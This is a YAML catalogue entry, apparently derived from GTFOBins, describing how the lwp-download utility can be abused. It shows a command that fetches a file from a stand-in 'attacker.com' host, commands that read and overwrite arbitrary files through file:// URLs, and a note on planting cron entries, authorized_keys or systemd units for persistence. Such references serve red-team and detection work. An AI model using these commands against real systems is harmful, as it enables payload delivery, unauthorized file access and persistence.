---
name: lwp-download
capabilities:
- read
- write
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: lwp-download http://attacker.com/path/to/input-file /path/to/output-file
  notes: The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory.
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: lwp-download file:///path/to/input-file /dev/stdout
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    echo DATA >/path/to/temp-file
    lwp-download file:///path/to/temp-file /path/to/output-file
- id: file-write-2
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: lwp-download file:///path/to/input-file /path/to/output-file
  notes: This actually copies a file to a destination.
references:
- https://gtfobins.github.io/gtfobins/lwp-download/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
